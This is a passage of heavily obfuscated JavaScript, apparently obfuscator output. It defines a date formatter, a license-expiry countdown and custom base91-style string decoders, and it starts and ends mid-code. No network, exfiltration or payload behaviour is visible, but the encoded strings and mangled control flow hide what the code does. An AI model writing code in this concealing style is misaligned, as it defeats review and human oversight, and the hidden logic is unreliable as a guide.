        (__p_5599204514_stack[__p_1521310311_dLR_36__JS_PREDICT__(0x5d)] =
          -__p_2786467427_dLR_0__JS_PREDICT__(0x1b)),
        (__p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)] =
          'D7(E;CF}[0oVy/T$6{Q5iqjLt>)4B!H.`=8cxW+<w2#@*_1Jh9g?M%"]bAzdRsI3ePv,kuX:^K|ra~&nNSOGplZfUYm'),
        (__p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x1e)] =
          "" +
          (__p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
            "")),
        (__p_5599204514_stack[
          __p_5599204514_stack.AJlY3n + __p_2786467427_dLR_0__JS_PREDICT__(0x42)
        ] =
          __p_5599204514_stack[
            __p_5599204514_stack.AJlY3n +
              __p_2786467427_dLR_0__JS_PREDICT__(0x41)
          ].length),
        (__p_5599204514_stack[0x3f] =
          __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)]),
        (__p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x3)] = []),
        (__p_5599204514_stack.KojjKT =
          __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x9)] -
          (__p_5599204514_stack.AJlY3n -
            __p_1521310311_dLR_36__JS_PREDICT__(0x38))),
        (__p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x5)] =
          __p_1521310311_dLR_36__JS_PREDICT__(0x38)),
        (__p_5599204514_stack.NRCI8V =
          -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
      );
      for (
        i = 0x0;
        i < __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2c)];
        i++
      ) {
        var __p_1860928323_dLR_37__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param > 0xa7
                ? index_param + 0x47
                : index_param < 0xa7
                ? index_param + 0x17
                : index_param - 0x9
            ];
          },
          0x1
        );
        __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x8)] =
          __p_5599204514_stack[
            __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x9)] +
              0x44
          ].indexOf(__p_5599204514_stack[0x2][i]);
        if (
          __p_5599204514_stack[__p_1860928323_dLR_37__JS_PREDICT__(0x14)] ===
          -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          continue;
        }
        if (
          __p_5599204514_stack.NRCI8V <
          __p_1521310311_dLR_36__JS_PREDICT__(0x38)
        ) {
          __p_5599204514_stack[__p_1860928323_dLR_37__JS_PREDICT__(0x16)] =
            __p_5599204514_stack.YGbZHU;
        } else {
          __p_2360982505(
            (__p_5599204514_stack.NRCI8V += __p_5599204514_stack.YGbZHU * 0x5b),
            (__p_5599204514_stack.KojjKT |=
              __p_5599204514_stack.NRCI8V <<
              __p_5599204514_stack[__p_1860928323_dLR_37__JS_PREDICT__(0x15)]),
            (__p_5599204514_stack.BLbmLeA +=
              (__p_5599204514_stack.NRCI8V & 0x1fff) > 0x58
                ? 0xd
                : __p_6523464476_dLR_34__JS_PREDICT__(0x10))
          );
          do {
            __p_2360982505(
              __p_5599204514_stack.emNe8lR.push(
                __p_5599204514_stack.KojjKT & 0xff
              ),
              (__p_5599204514_stack[
                __p_1860928323_dLR_37__JS_PREDICT__(0x18)
              ] >>= 0x8),
              (__p_5599204514_stack.BLbmLeA -= 0x8)
            );
          } while (__p_5599204514_stack.BLbmLeA > 0x7);
          __p_5599204514_stack[__p_1860928323_dLR_37__JS_PREDICT__(0x16)] = -(
            __p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x7)] +
            __p_2786467427_dLR_0__JS_PREDICT__(0x1c)
          );
        }
      }
      if (
        __p_5599204514_stack[__p_6523464476_dLR_34__JS_PREDICT__(-0x4)] >
        -(
          __p_5599204514_stack[__p_1521310311_dLR_36__JS_PREDICT__(0x5d)] + 0x44
        )
      ) {
        var __p_1808352123_dLR_38__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param < -0x4e ? index_param + 0xf : index_param + 0x4d
            ];
          },
          0x1
        );
        __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x5)].push(
          (__p_5599204514_stack[__p_1521310311_dLR_36__JS_PREDICT__(0x62)] |
            (__p_5599204514_stack[__p_1521310311_dLR_36__JS_PREDICT__(0x60)] <<
              __p_5599204514_stack.BLbmLeA)) &
            __p_1808352123_dLR_38__JS_PREDICT__(-0x36)
        );
      }
      return __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x9)] >
        0x40
        ? __p_5599204514_stack[
            __p_5599204514_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x9)] +
              0x127
          ]
        : __p_1990998267__JS_PREDICT__(__p_5599204514_stack.emNe8lR);
    }
  }, __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
  formatDate = (timestamp) => {
    var __p_8307769731__JS_PREDICT__, __p_3015025205, __p_1025912463;
    function __p_8536571514_dLR_43__JS_PREDICT__(index_param) {
      return __p_9551561833[
        index_param > 0x7 ? index_param - 0x8 : index_param + 0x2
      ];
    }
    __p_2360982505(
      (__p_8307769731__JS_PREDICT__ = __p_6510065121(
        (...__p_7682910781_stack) => {
          var __p_8125125118_dLR_41__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < -0x33
                  ? index_param - 0x58
                  : index_param > 0x8c
                  ? index_param + 0x4
                  : index_param < -0x33
                  ? index_param - 0x17
                  : index_param < 0x8c
                  ? index_param + 0x32
                  : index_param - 0x1a
              ];
            },
            0x1
          );
          __p_2360982505(
            (__p_7682910781_stack.length =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_7682910781_stack[0x48] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x2))
          );
          if (
            typeof __p_7682910781_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
            ] === "undefined"
          ) {
            __p_7682910781_stack[__p_7682910781_stack[0x48] - 0x54] =
              __p_6665957549__JS_PREDICT____JS_CRITICAL__;
          }
          __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x3)] = 0x36;
          if (
            typeof __p_7682910781_stack[0x4] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          if (
            __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_7682910781_stack[__p_7682910781_stack.WKuYm3 - 0x33]
          ) {
            var __p_7968717603_dLR_39__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param > 0xde
                    ? index_param - 0x3f
                    : index_param < 0xde
                    ? index_param - 0x20
                    : index_param + 0x20
                ];
              },
              0x1
            );
            return __p_7682910781_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
            ]
              ? __p_7682910781_stack[__p_7682910781_stack[0x48] - 0x57][
                  __p_7682910781_stack[
                    __p_7682910781_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x3)
                    ] -
                      (__p_7682910781_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                      ] -
                        __p_8536571514_dLR_43__JS_PREDICT__(0x3e))
                  ][
                    __p_7682910781_stack[
                      __p_7682910781_stack[0x48] -
                        __p_7968717603_dLR_39__JS_PREDICT__(0x98)
                    ]
                  ]
                ]
              : __p_3576149457[
                  __p_7682910781_stack[
                    __p_7682910781_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                    ] - __p_2786467427_dLR_0__JS_PREDICT__(-0x2)
                  ]
                ] ||
                  ((__p_7682910781_stack[0x2] =
                    __p_7682910781_stack[__p_7682910781_stack.WKuYm3 - 0x32][
                      __p_7682910781_stack[
                        __p_7682910781_stack[
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                        ] - __p_2786467427_dLR_0__JS_PREDICT__(-0x2)
                      ]
                    ] || __p_7682910781_stack[0x3]),
                  (__p_3576149457[
                    __p_7682910781_stack[
                      __p_7682910781_stack[0x48] -
                        __p_7968717603_dLR_39__JS_PREDICT__(0x51)
                    ]
                  ] = __p_7682910781_stack[
                    __p_7682910781_stack[
                      __p_7968717603_dLR_39__JS_PREDICT__(0x50)
                    ] - 0x34
                  ](__p_1940297625[__p_7682910781_stack[0x0]])));
          }
          if (
            __p_7682910781_stack[0x2] &&
            __p_7682910781_stack[
              __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x3)] -
                __p_2786467427_dLR_0__JS_PREDICT__(-0x19)
            ] !== __p_6665957549__JS_PREDICT____JS_CRITICAL__
          ) {
            var __p_9690340623_dLR_40__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param < -0x8
                    ? index_param + 0x59
                    : index_param < -0x8
                    ? index_param + 0x1a
                    : index_param < -0x8
                    ? index_param + 0x40
                    : index_param < -0x8
                    ? index_param - 0x61
                    : index_param + 0x7
                ];
              },
              0x1
            );
            __p_8307769731__JS_PREDICT__ =
              __p_6665957549__JS_PREDICT____JS_CRITICAL__;
            return __p_8307769731__JS_PREDICT__(
              __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              -0x1,
              __p_7682910781_stack[
                __p_7682910781_stack[
                  __p_7682910781_stack[
                    __p_9690340623_dLR_40__JS_PREDICT__(0x1c)
                  ] - 0xf
                ] - 0x55
              ],
              __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)],
              __p_7682910781_stack[__p_9690340623_dLR_40__JS_PREDICT__(0x7)]
            );
          }
          if (
            __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_7682910781_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ) {
            return (
              __p_7682910781_stack[
                __p_7682910781_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                ] - 0x53
              ][
                __p_7682910781_stack[
                  __p_7682910781_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                  ] -
                    (__p_7682910781_stack.WKuYm3 +
                      (__p_7682910781_stack[0x48] -
                        __p_8125125118_dLR_41__JS_PREDICT__(0x2e)))
                ]
              ] ||
              (__p_7682910781_stack[0x4][
                __p_7682910781_stack[
                  __p_7682910781_stack[0x48] -
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2)
                ]
              ] = __p_7682910781_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ](
                __p_1940297625[
                  __p_7682910781_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ]
              ))
            );
          }
          if (
            __p_7682910781_stack[
              __p_7682910781_stack[__p_8125125118_dLR_41__JS_PREDICT__(-0xf)] -
                (__p_7682910781_stack[
                  __p_8125125118_dLR_41__JS_PREDICT__(-0x2)
                ] +
                  0x20)
            ]
          ) {
            [
              __p_7682910781_stack[
                __p_7682910781_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x10)
                ] - __p_8125125118_dLR_41__JS_PREDICT__(0x1)
              ],
              __p_7682910781_stack[
                __p_7682910781_stack.WKuYm3 -
                  __p_8125125118_dLR_41__JS_PREDICT__(0x0)
              ],
            ] = [
              __p_7682910781_stack[__p_7682910781_stack[0x48] - 0x54](
                __p_7682910781_stack[
                  __p_7682910781_stack[0x48] -
                    __p_8125125118_dLR_41__JS_PREDICT__(0x1)
                ]
              ),
              __p_7682910781_stack[
                __p_8125125118_dLR_41__JS_PREDICT__(-0x2d)
              ] ||
                __p_7682910781_stack[
                  __p_7682910781_stack[
                    __p_8125125118_dLR_41__JS_PREDICT__(-0xf)
                  ] - __p_2786467427_dLR_0__JS_PREDICT__(0x1)
                ],
            ];
            return __p_8307769731__JS_PREDICT__(
              __p_7682910781_stack[0x0],
              __p_7682910781_stack[0x4],
              __p_7682910781_stack[
                __p_7682910781_stack[0x48] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x1)
              ]
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      )),
      (__p_3015025205 = {
        xzEvZ5: __p_8307769731__JS_PREDICT__(0x9),
        CU5Tm6: __p_8307769731__JS_PREDICT__(0xc),
      }),
      (__p_1025912463 = [
        __p_8307769731__JS_PREDICT__(0x8),
        __p_8307769731__JS_PREDICT__(0xa),
      ])
    );
    const date = new Date(
      Math[
        __p_8307769731__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x2))
      ](
        __p_0575541368_calc(
          timestamp,
          __p_8536571514_dLR_43__JS_PREDICT__(0x44),
          (__p_6857802341 = -0xd)
        )
      )
    );
    let day = date[__p_1025912463[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]](),
      month = __p_0575541368_calc(
        date[__p_3015025205.xzEvZ5](),
        __p_2786467427_dLR_0__JS_PREDICT__(-0x28),
        (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
      );
    const year =
      date[__p_1025912463[0x1] + __p_8307769731__JS_PREDICT__(0xb)]();
    if (day < 0xa && __p_9743501678.yaLutw()) {
      day = __p_0575541368_calc(
        "0",
        day,
        __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
      );
    }
    if (
      month < 0xa &&
      __p_9743501678.vVupayL > __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
    ) {
      var __p_3222386997_dLR_42__JS_PREDICT__ = __p_0896022738(
        (index_param) => {
          return __p_9551561833[
            index_param < 0xb9
              ? index_param > 0xb9
                ? index_param - 0x60
                : index_param < 0xb9
                ? index_param + 0x5
                : index_param - 0x25
              : index_param - 0x13
          ];
        },
        0x1
      );
      month = __p_0575541368_calc(
        "0",
        month,
        __p_0333540851(-__p_3222386997_dLR_42__JS_PREDICT__(0x24))
      );
    }
    const yearShort = year[__p_3015025205.CU5Tm6]()[
      __p_8307769731__JS_PREDICT__(__p_8536571514_dLR_43__JS_PREDICT__(0x30))
    ](
      __p_0575541368_calc(
        __p_2786467427_dLR_0__JS_PREDICT__(-0x20),
        __p_0333540851(-__p_8536571514_dLR_43__JS_PREDICT__(0x3e))
      )
    );
    return `${day}/${month}/${yearShort}`;
    function __p_6665957549__JS_PREDICT____JS_CRITICAL__(
      ...__p_8360114759_stack
    ) {
      var i;
      function __p_8968739721_dLR_44__JS_PREDICT__(index_param) {
        return __p_9551561833[
          index_param > 0xe1
            ? index_param - 0x3b
            : index_param > 0x22
            ? index_param > 0xe1
              ? index_param + 0x4a
              : index_param < 0xe1
              ? index_param - 0x23
              : index_param + 0x18
            : index_param - 0x31
        ];
      }
      __p_2360982505(
        (__p_8360114759_stack.length =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
        (__p_8360114759_stack.NSyO4S1 = 0x66),
        (__p_8360114759_stack.NFW4tBO =
          '>0x(@~"]6$}[.*%NJ!{G_s+l9?iLhcwo&qvtFu3mQ/:aET2DdP<5k7I1`4)fWOCrYb=;MjSp|H,BgZ8nyRe^K#zXUAV'),
        (__p_8360114759_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x4)] = -0x1f),
        (__p_8360114759_stack[__p_8536571514_dLR_43__JS_PREDICT__(0x41)] =
          "" +
          (__p_8360114759_stack[__p_8536571514_dLR_43__JS_PREDICT__(0xd)] ||
            "")),
        (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5b)] =
          __p_8360114759_stack[
            __p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5a)] +
              0x25
          ]),
        (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x32)] =
          __p_8360114759_stack.WamTfX.length),
        (__p_8360114759_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] = []),
        (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x34)] =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5b)] =
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x58)] = -0x1)
      );
      for (
        i = __p_8968739721_dLR_44__JS_PREDICT__(0x28);
        i < __p_8360114759_stack[0x3];
        i++
      ) {
        __p_8360114759_stack[0x9] = __p_8360114759_stack.NFW4tBO.indexOf(
          __p_8360114759_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x6)][i]
        );
        if (
          __p_8360114759_stack[
            __p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5e)] -
              (__p_8360114759_stack.yCZCWDm + 0x7c)
          ] === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          continue;
        }
        if (
          __p_8360114759_stack[__p_8360114759_stack.NSyO4S1 - 0x5f] <
          __p_8968739721_dLR_44__JS_PREDICT__(0x28)
        ) {
          __p_8360114759_stack[0x7] =
            __p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5d)];
        } else {
          var __p_6035108338_dLR_45__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0xdf
                  ? index_param > 0xdf
                    ? index_param - 0x23
                    : index_param < 0xdf
                    ? index_param > 0x20
                      ? index_param - 0x21
                      : index_param - 0x3e
                    : index_param - 0x2
                  : index_param + 0x51
              ];
            },
            0x1
          );
          __p_2360982505(
            (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x58)] +=
              __p_8360114759_stack[0x9] * 0x5b),
            (__p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x34)] |=
              __p_8360114759_stack[__p_6035108338_dLR_45__JS_PREDICT__(0x56)] <<
              __p_8360114759_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x5)]),
            (__p_8360114759_stack[__p_8536571514_dLR_43__JS_PREDICT__(0x40)] +=
              (__p_8360114759_stack[
                __p_8360114759_stack[
                  __p_8536571514_dLR_43__JS_PREDICT__(0x43)
                ] -
                  (__p_8360114759_stack.yCZCWDm + 0x7e)
              ] &
                0x1fff) >
              0x58
                ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                : __p_8360114759_stack[
                    __p_8968739721_dLR_44__JS_PREDICT__(0x5e)
                  ] - __p_8968739721_dLR_44__JS_PREDICT__(0x40))
          );
          do {
            __p_2360982505(
              __p_8360114759_stack[
                __p_8968739721_dLR_44__JS_PREDICT__(0x31)
              ].push(__p_8360114759_stack[0x5] & 0xff),
              (__p_8360114759_stack[0x5] >>=
                __p_8536571514_dLR_43__JS_PREDICT__(0x26)),
              (__p_8360114759_stack[0x71] -=
                __p_8968739721_dLR_44__JS_PREDICT__(0x41))
            );
          } while (
            __p_8360114759_stack[__p_8968739721_dLR_44__JS_PREDICT__(0x5b)] >
            0x7
          );
          __p_8360114759_stack[0x7] = -0x1;
        }
      }
      if (__p_8360114759_stack[__p_8360114759_stack.yCZCWDm + 0x26] > -0x1) {
        __p_8360114759_stack[__p_8536571514_dLR_43__JS_PREDICT__(0x16)].push(
          (__p_8360114759_stack[0x5] |
            (__p_8360114759_stack[__p_8360114759_stack.yCZCWDm + 0x26] <<
              __p_8360114759_stack[0x71])) &
            0xff
        );
      }
      return __p_8360114759_stack.NSyO4S1 > 0xbe
        ? __p_8360114759_stack[-0xda]
        : __p_1990998267__JS_PREDICT__(
            __p_8360114759_stack[__p_8536571514_dLR_43__JS_PREDICT__(0x16)]
          );
    }
  },
  countdownLicense = (expiryTimestamp) => {
    var __p_8308669456__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === "undefined") {
          a = __p_1869606457__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (y) {
          [b, y] = [a(b), x || z];
          return __p_8308669456__JS_PREDICT__(x, b, z);
        }
        if (z == x) {
          return (y[__p_3576149457[z]] = __p_8308669456__JS_PREDICT__(x, y));
        }
        if (a === void 0x0) {
          __p_8308669456__JS_PREDICT__ = b;
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      },
      __p_5985986248,
      __p_4885934162;
    __p_2360982505(
      (__p_5985986248 = [__p_8308669456__JS_PREDICT__(0xf)]),
      (__p_4885934162 = __p_8308669456__JS_PREDICT__[
        __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
      ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), 0xf))
    );
    const currentTime = Date[__p_8308669456__JS_PREDICT__(0xe)]();
    let remainingTime = __p_0575541368_calc(
      Math[__p_8308669456__JS_PREDICT__(0xf)](
        expiryTimestamp * __p_2786467427_dLR_0__JS_PREDICT__(0x9)
      ),
      currentTime,
      (__p_6857802341 = __p_2786467427_dLR_0__JS_PREDICT__(0xa))
    );
    if (remainingTime <= 0x0 && __p_9743501678.yaLutw()) {
      var __p_1230645799__JS_PREDICT__ = (x, y, z, a, b) => {
          var __p_5471726892_dLR_46__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < 0x112
                  ? index_param < 0x53
                    ? index_param - 0x22
                    : index_param > 0x112
                    ? index_param - 0x2e
                    : index_param - 0x54
                  : index_param + 0x52
              ];
            },
            0x1
          );
          if (typeof a === __p_5471726892_dLR_46__JS_PREDICT__(0x60)) {
            a = __p_0911885785__JS_PREDICT____JS_CRITICAL__;
          }
          if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
            b = __p_3576149457;
          }
          if (z == x) {
            return (y[__p_3576149457[z]] = __p_1230645799__JS_PREDICT__(x, y));
          }
          if (z && a !== __p_0911885785__JS_PREDICT____JS_CRITICAL__) {
            __p_1230645799__JS_PREDICT__ =
              __p_0911885785__JS_PREDICT____JS_CRITICAL__;
            return __p_1230645799__JS_PREDICT__(
              x,
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
              z,
              a,
              b
            );
          }
          if (x !== y) {
            return b[x] || (b[x] = a(__p_1940297625[x]));
          }
          if (a === __p_1230645799__JS_PREDICT__) {
            __p_0911885785__JS_PREDICT____JS_CRITICAL__ = y;
            return __p_0911885785__JS_PREDICT____JS_CRITICAL__(z);
          }
          if (a === __p_5471726892_dLR_46__JS_PREDICT__(0x69)) {
            __p_1230645799__JS_PREDICT__ = b;
          }
        },
        __p_5776613238;
      __p_5776613238 = __p_1230645799__JS_PREDICT__(
        __p_2786467427_dLR_0__JS_PREDICT__(0xb)
      );
      return (
        __p_8308669456__JS_PREDICT__(0x10) +
        __p_1230645799__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0xc)) +
        __p_5776613238
      );
      function __p_0911885785__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'w38v$!/`u]_7?1|0C^eET,&xrO{WjPLtZ[J>Gzo6ag@QRnb9;lfqH%V*#.B~:+iFpDS5K(k2hIds}NcM)=UX"4AmYy<',
        raw,
        len,
        ret = [],
        b = 0x0,
        n,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -0x1) {
            continue;
          }
          if (v < 0x0) {
            v = p;
          } else {
            var __p_1052775979_dLR_47__JS_PREDICT__ = __p_0896022738(
              (index_param) => {
                return __p_9551561833[
                  index_param < 0x62
                    ? index_param + 0x1b
                    : index_param < 0x62
                    ? index_param - 0x1d
                    : index_param < 0x62
                    ? index_param - 0x1b
                    : index_param - 0x63
                ];
              },
              0x1
            );
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) > 0x58
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= 0x8),
                (n -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -__p_1052775979_dLR_47__JS_PREDICT__(0x6e);
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
    const minute = 0xea60,
      hour = __p_0575541368_calc(minute, 0x3c, (__p_6857802341 = -0xd)),
      day = __p_0575541368_calc(
        hour,
        0x18,
        (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xb))
      ),
      daysRemaining = Math[
        __p_8308669456__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0xf))
      ](
        __p_0575541368_calc(
          remainingTime,
          day,
          __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(0x7))
        )
      ),
      hoursRemaining = __p_8438996831__JS_CRITICAL__(
        (remainingTime %= day),
        Math[__p_4885934162](
          __p_0575541368_calc(remainingTime, hour, __p_0333540851(-0x9))
        )
      ),
      minutesRemaining = __p_8438996831__JS_CRITICAL__(
        (remainingTime %= hour),
        Math[__p_5985986248[0x0]](
          __p_0575541368_calc(
            remainingTime,
            minute,
            __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(0x7))
          )
        )
      );
    return `${daysRemaining} Days ${hoursRemaining} Hours ${minutesRemaining} Minutes`;
    function __p_1869606457__JS_PREDICT____JS_CRITICAL__(
      ...__p_7502997530_stack
    ) {
      var i;
      __p_2360982505(
        (__p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] = 0x1),
        (__p_7502997530_stack.A7Mb1v = -0x6a),
        (__p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x11)] =
          'ZTNWCq]P$!_"x=FL`dUnXtr5/0o[#.e<RI:,(c9Aa3;?v*uBgbDshJKVQ1S2fOM~7i4jp@|H%Y{}l8mkywG)>^6&+Ez'),
        (__p_7502997530_stack.SPyWny = "" + (__p_7502997530_stack[0x0] || "")),
        (__p_7502997530_stack.DNBMvlr = __p_7502997530_stack.SPyWny.length),
        (__p_7502997530_stack[__p_7502997530_stack.A7Mb1v + 0x6e] = []),
        (__p_7502997530_stack[
          __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] + 0x6f
        ] = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (__p_7502997530_stack.kTlKYU = 0x0),
        (__p_7502997530_stack[0x7] = -0x1)
      );
      for (
        i =
          __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] + 0x6a;
        i < __p_7502997530_stack.DNBMvlr;
        i++
      ) {
        __p_7502997530_stack[
          __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] +
            __p_2786467427_dLR_0__JS_PREDICT__(0x12)
        ] = __p_7502997530_stack[
          __p_2786467427_dLR_0__JS_PREDICT__(0x11)
        ].indexOf(__p_7502997530_stack.SPyWny[i]);
        if (
          __p_7502997530_stack[
            __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x12)
          ] === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          continue;
        }
        if (__p_7502997530_stack[0x7] < 0x0) {
          __p_7502997530_stack[0x7] =
            __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)];
        } else {
          __p_2360982505(
            (__p_7502997530_stack[0x7] +=
              __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] *
              0x5b),
            (__p_7502997530_stack[0x5] |=
              __p_7502997530_stack[
                __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] +
                  0x71
              ] <<
              __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x13)]),
            (__p_7502997530_stack.kTlKYU +=
              (__p_7502997530_stack[0x7] & 0x1fff) >
              __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x10)] -
                (__p_7502997530_stack.A7Mb1v - 0x58)
                ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                : 0xe)
          );
          do {
            __p_2360982505(
              __p_7502997530_stack[0x4].push(
                __p_7502997530_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
                ] & 0xff
              ),
              (__p_7502997530_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
              ] >>= 0x8),
              (__p_7502997530_stack.kTlKYU -=
                __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
            );
          } while (
            __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x13)] >
            __p_2786467427_dLR_0__JS_PREDICT__(0x2)
          );
          __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] = -0x1;
        }
      }
      if (
        __p_7502997530_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] >
        -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
      ) {
